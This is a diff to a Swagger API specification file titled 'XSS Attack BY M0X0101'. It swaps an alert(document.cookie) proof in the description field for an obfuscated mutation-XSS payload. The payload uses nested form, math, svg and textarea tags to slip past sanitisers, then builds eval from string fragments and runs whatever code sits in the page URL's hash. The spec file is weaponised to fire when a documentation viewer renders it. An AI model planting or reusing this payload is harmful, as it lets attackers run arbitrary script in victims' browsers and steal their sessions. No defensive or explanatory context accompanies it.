@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img/src/onerror %09=testing%3dtop['ev'+'al'];foundit=top['loca'+'tion']['hash']><img/src/onerror
+ =testing(decodeURI(foundit.substr(1)))>"></form>
   version: production
 basePath: /JSSResource/
 produces:
